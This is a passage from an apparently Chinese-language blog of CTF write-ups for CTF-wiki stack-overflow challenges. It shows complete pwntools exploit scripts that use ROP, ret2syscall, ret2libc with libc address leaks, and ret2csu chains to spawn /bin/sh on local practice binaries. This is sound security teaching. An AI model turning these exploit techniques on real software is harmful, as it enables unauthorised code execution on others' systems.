“<code>/bin/sh</code>“</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2syscall4.png" alt="CTFwiki_ret2syscall4.png"></p><p>查看寄存器是否满足要求：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2syscall5.png" alt="CTFwiki_ret2syscall5.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2syscall6.png" alt="CTFwiki_ret2syscall6.png"></p><p>可以凑齐对 <code>eax</code>、<code>ebx</code>、<code>ecx</code>、<code>edx</code> 的控制</p><p>确定偏移量：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2syscall7.png" alt="CTFwiki_ret2syscall7.png"></p><p>编写 shellcode 执行 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> <strong>（注意这里通过 gdb 调试的溢出值是 112，也和 IDA 不同，以 gdb 的调试结果为准）</strong></p><hr><h2 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2syscall"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span>pop_eax_addr <span class="token operator">=</span> <span class="token number">0x080bb196</span>pop_edx_ecx_ebx_addr <span class="token operator">=</span> <span class="token number">0x0806eb90</span>int_0x80_addr <span class="token operator">=</span> <span class="token number">0x08049421</span>bin_sh_addr <span class="token operator">=</span> <span class="token number">0x080be408</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>int_0x80_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"What do you plan to do?\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2syscall8.png" alt="image.png"></p><hr><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><p>题目链接：<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p><p>分析程序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc1%201.png" alt="CTFwiki-ret2libc1 1.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc1%202.png" alt="CTFwiki-ret2libc1 2.png"></p><p><code>get()</code> 可以溢出</p><p>发现有后门函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc1%203.png" alt="CTFwiki-ret2libc1 3.png"></p><p>与 ret2text 那道题类似，但这里 <code>system()</code> 的参数不是 “<code>/bin/sh</code>“<br>发现程序里是有 “<code>/bin/sh</code>“ 的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc1%204.png" alt="CTFwiki-ret2libc1 4.png"></p><p>所以思路就是控制 <code>system()</code> 的参数为 “<code>/bin/sh</code>“ <strong>（注意这里通过 gdb 调试的溢出值是 112，也和 IDA 不同，以 gdb 的调试结果为准）</strong></p><hr><h2 id="脚本一-1"><a href="#脚本一-1" class="headerlink" title="脚本一"></a>脚本一</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2libc1"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span>bin_sh_addr <span class="token operator">=</span> <span class="token number">0x08048720</span>call_system_addr <span class="token operator">=</span> <span class="token number">0x08048611</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>call_system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"RET2LIBC >_&lt;\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="脚本二-1"><a href="#脚本二-1" class="headerlink" title="脚本二"></a>脚本二</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2libc1"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span>bin_sh_addr <span class="token operator">=</span> <span class="token number">0x08048720</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2libc1"</span><span class="token punctuation">)</span>system_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"RET2LIBC >_&lt;\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc1%205.png" alt="CTFwiki-ret2libc1 5.png"></p><hr><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><p>题目链接：<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p><p>分析程序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc2%201.png" alt="CTFwiki-ret2libc2 1.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc2%202.png" alt="CTFwiki-ret2libc2 2.png"></p><p><code>get()</code> 存在栈溢出</p><p>仍然存在后门函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc2%203.png" alt="CTFwiki-ret2libc2 3.png"></p><p>但是这次没有 “<code>/bin/sh</code>“</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc2%204.png" alt="CTFwiki-ret2libc2 4.png"></p><p>考虑先通过溢出执行 <code>gets()</code> 函数，向 bss 段上写入 “<code>/bin/sh</code>“，然后再执行 <code>system()</code> 来调用</p><p>给 <code>gets()</code> 的参数存放在 <code>ebx</code> 中</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc2%205.png" alt="CTFwiki-ret2libc2 5.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc2%206.png" alt="CTFwiki-ret2libc2 6.png"></p><p><strong>（注意这里通过 gdb 调试的溢出值是 112，也和 IDA 不同，以 gdb 的调试结果为准）</strong></p><hr><h2 id="脚本一-2"><a href="#脚本一-2" class="headerlink" title="脚本一"></a>脚本一</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2libc2"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2libc2"</span><span class="token punctuation">)</span>gets_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span>call_system_addr <span class="token operator">=</span> <span class="token number">0x08048641</span>bss_addr <span class="token operator">=</span> <span class="token number">0x804a080</span>pop_ebx_addr <span class="token operator">=</span> <span class="token number">0x0804843d</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gets_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_ebx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>call_system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"What do you think ?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="脚本二-2"><a href="#脚本二-2" class="headerlink" title="脚本二"></a>脚本二</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2libc2"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2libc2"</span><span class="token punctuation">)</span>gets_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span>system_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bss_addr <span class="token operator">=</span> <span class="token number">0x804a080</span>pop_ebx_addr <span class="token operator">=</span> <span class="token number">0x0804843d</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gets_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_ebx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"What do you think ?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc2%207.png" alt="CTFwiki-ret2libc2 7.png"></p><hr><h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><p>题目链接：<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p><p>分析程序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc3%201.png" alt="CTFwiki-ret2libc3 1.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc3%202.png" alt="CTFwiki-ret2libc3 2.png"></p><p>还是有后门函数，但是给的是 <code>puts()</code> 不是 <code>system()</code>，在 IDA 发现程序没有给出 <code>system()</code> 函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc3%203.png" alt="CTFwiki-ret2libc3 3.png"></p><p>同样也没有 “<code>/bin/sh</code>“</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc3%204.png" alt="CTFwiki-ret2libc3 4.png"></p><p>考虑先通过 <code>puts()</code> 函数来泄露一个函数的真实地址（我这里以泄露 <code>__libc_start_main</code> 为例）<br>然后使用 libc 来得到 <code>system()</code> 函数和 “<code>/bin/sh</code>“ 的地址</p><p><strong>（注意这里通过 gdb 调试的溢出值是 112，也和 IDA 不同，以 gdb 的调试结果为准）</strong></p><blockquote><p>注意：<br>如果你是按照网上的教程通过 git 安装的 <code>LibcSearcher</code>，脚本可能会报错 “<code>libcsearcher No matched libc, please add more libc or try others</code>“，<em>详见 《Ubuntu22.04虚拟机环境搭建》 中 <a href="Ubuntu22.04%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md#%E5%AE%89%E8%A3%85%20LibcSearcher">安装 LibcSearcher</a> 一节</em></p></blockquote><hr><h2 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearchercontext<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2libc3"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2libc3"</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>puts_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>libc_start_main_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>libc_start_main_got_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Can you find it !?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>libc_start_main_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span> libc_start_main_addr<span class="token punctuation">)</span>libcbase <span class="token operator">=</span> libc_start_main_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">104</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Can you find it !?'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2libc3%205.png" alt="CTFwiki-ret2libc3 5.png"></p><hr><h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>题目链接：<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/level5">ret2csu</a><br>libc 文件：<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/libc.so.6">ret2csu - libc.so.6</a> <a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/libc.so">ret2csu - libc.so</a></p><p>分析程序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2csu1.png" alt="CTFwiki-ret2csu1.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2csu2.png" alt="CTFwiki-ret2csu2.png"></p><p>在 <code>vulnerable_function()</code> 中可以溢出：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2csu3.png" alt="CTFwiki-ret2csu3.png"></p><p>并且这一次是什么都没有：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2csu4.png" alt="CTFwiki-ret2csu4.png"></p><p>找到 <code>__libc_csu_init</code> 函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2csu5.png" alt="CTFwiki-ret2csu5.png"></p><p>确定两段 gadget 的地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2csu6.png" alt="CTFwiki-ret2csu6.png"></p><p>开始利用 ret2csu 构造</p><blockquote><p>这个题 libc 版本有点坑，使用 LibcSearcher 找到的 libc 很多都打不通，包括 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5">hitcon-level5</a> 中给出的 libc.so.6</p><p>最后用 Ubuntu 22.04 自带的 libc 打通</p><p>另外，这个题构造 <code>system(&quot;/bin/sh&quot;)</code> 无法 get shell，但是通过系统调用 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 可以，应该是环境变量的问题</p></blockquote><hr><p>另外，<strong>如果使用的是旧版本的 Ubuntu 16.04 环境</strong>  </p><p>例如，libc 版本为 2.23，ldd (Ubuntu GLIBC 2.23-0ubuntu11.3) 2.23</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2csu8.png" alt="CTFwiki-ret2csu8.png"></p><p>可以指定程序的 libc 为题目给出的 libc，这样不用 Ubuntu 16.04 自带的 libc 也是可以打通的 （当然自带的 libc 也可以打通）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># from LibcSearcher import *</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2csu"</span><span class="token punctuation">,</span> env<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">:</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径, 指定 libc 为题目给的 libc</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2csu"</span><span class="token punctuation">)</span><span class="token comment"># 使用 Ubuntu 16.04 自带的 libc</span><span class="token comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") </span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如图：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2csu9.png" alt="CTFwiki-ret2csu9.png"></p><hr><h2 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># from LibcSearcher import *</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2csu"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2csu"</span><span class="token punctuation">)</span><span class="token comment"># 使用 Ubuntu 22.04 自带的 libc</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/usr/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span> write_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>read_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>gadget1_addr <span class="token operator">=</span> <span class="token number">0x4011DE</span>gadget2_addr <span class="token operator">=</span> <span class="token number">0x4011C8</span><span class="token comment"># 第一次 csu 泄露 read 函数的真实地址, 然后回到 main</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget1_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>gadget2_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token comment"># 记录 read 函数的真实地址</span>read_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 根据 read 函数真实地址在 libc 中的偏移计算 execve 函数的真实地址</span>libcbase <span class="token operator">=</span> read_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>execve_addr <span class="token 